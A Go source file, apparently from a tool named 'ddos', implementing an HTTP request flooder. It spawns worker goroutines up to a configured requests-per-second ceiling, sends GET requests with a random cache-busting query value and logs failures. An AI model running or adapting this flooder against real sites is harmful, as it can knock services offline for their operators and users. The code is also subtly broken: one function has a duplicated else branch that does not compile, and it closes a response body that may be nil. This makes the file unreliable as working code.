package ddosservice

import (
	"context"
	ddos "ddos/config"
	"ddos/internal/ddos/domain/model"
	display "ddos/internal/display/app"
	logservice "ddos/internal/log/domain/service"
	statservice "ddos/internal/stat/domain/service"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

type Flooder struct {
	mu  *sync.RWMutex
	ctx context.Context

	logReqCh  chan *model.Response
	cfg       *ddos.Config
	display   *display.Display
	logger    *logservice.Logger
	collector *statservice.Collector
}

func NewFlooder(
	ctx context.Context,
	cfg *ddos.Config,
	display *display.Display,
	logger *logservice.Logger,
	collector *statservice.Collector,
) *Flooder {
	return &Flooder{
		mu:        &sync.RWMutex{},
		logReqCh:  make(chan *model.Response, int64(cfg.MaxRPS)*cfg.MaxWorkers),
		ctx:       ctx,
		cfg:       cfg,
		display:   display,
		logger:    logger,
		collector: collector,
	}
}

func (f *Flooder) Run() {
	lwg := &sync.WaitGroup{}
	defer lwg.Wait()
	lwg.Add(1)
	go func() {
		defer lwg.Done()

		for response := range f.logReqCh {
			f.logFailedRequest(response)
		}
	}()

	wg := &sync.WaitGroup{}
	defer func() {
		wg.Wait()
		close(f.logReqCh)
	}()
	wg.Add(1)
	go func() {
		defer wg.Done()

		requestSendTicker := time.NewTicker(time.Second / time.Duration(float64(f.cfg.MaxRPS)*1.10))
		defer requestSendTicker.Stop()

		threadSpawnTicker := time.NewTicker(time.Millisecond * 50)
		defer threadSpawnTicker.Stop()

		for {
			f.collector.SetRPS()

			select {
			case <-f.ctx.Done():
				return
			case <-threadSpawnTicker.C:
				f.spawnThread(wg, requestSendTicker, f.collector.RPS())
			}
		}
	}()
}

func (f *Flooder) spawnThread(wg *sync.WaitGroup, requestSendTicker *time.Ticker, crps int64) {
	trps := int64(float64(f.cfg.MaxRPS) * 0.95)
	if crps < trps && f.collector.Workers() < f.cfg.MaxWorkers {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-f.ctx.Done():
					return
				case <-requestSendTicker.C:
					f.sendRequest()
				}
			}
		}()
		f.collector.AddWorker()
	}
}

func (f *Flooder) sendRequest() {
	rand.Seed(time.Now().UnixNano())

	s := time.Now()
	defer func() {
		f.collector.AddTotal()
		f.collector.AddTotalDuration(time.Since(s))
	}()

	resp, err := http.Get(fmt.Sprintf("%v&ts=%d", f.cfg.URL, rand.Uint64()))
	if err != nil || resp.StatusCode != 200 {
		f.collector.AddFailed()
		f.collector.AddFailedDuration(time.Since(s))

		f.logReqCh <- &model.Response{
			Resp: resp,
			Err:  err,
		}

		return
	} else {
		_, _ = io.Copy(io.Discard, resp.Body)
		_ = resp.Body.Close()
	}

	f.collector.AddSuccess()
	f.collector.AddSuccessDuration(time.Since(s))
}

func (f *Flooder) logFailedRequest(response *model.Response) {
	defer func() { _ = response.Resp.Body.Close() }()

	type Log struct {
		URL        string              `json:"URL,omitempty"`
		Error      string              `json:"error,omitempty"`
		StatusCode int                 `json:"statusCode,omitempty"`
		Headers    map[string][]string `json:"headers,omitempty"`
		Data       map[string]string   `json:"data,omitempty"`
	}

	if response.Err != nil {
		bytes, merr := json.MarshalIndent(Log{Error: response.Err.Error()}, "", "  ")
		if merr != nil {
			f.logger.Println(merr.Error())
			return
		}

		f.logger.Println(string(bytes))
	} else {
		l := Log{
			URL:        response.Resp.Request.URL.String(),
			StatusCode: response.Resp.StatusCode,
		}

		if len(f.cfg.LogHeaders) > 0 {
			l.Headers = make(map[string][]string, len(f.cfg.LogHeaders))
			for _, h := range f.cfg.LogHeaders {
				l.Headers[h] = response.Resp.Header.Values(h)
			}
		}

		if f.cfg.ResponseData != "" {
			l.Data = make(map[string]string, 2)
			bytes, rerr := io.ReadAll(response.Resp.Body)
			if rerr != nil {
				f.logger.Println(rerr.Error())
				return
			}
			l.Data["expected"] = f.cfg.ResponseData
			l.Data["gotten"] = string(bytes)
		}

		bytes, merr := json.MarshalIndent(l, "", "  ")
		if merr != nil {
			f.logger.Println(merr.Error())
			return
		}

		f.logger.Println(string(bytes))
	} else {
		_ = response.Resp.Body.Close()
	}
}
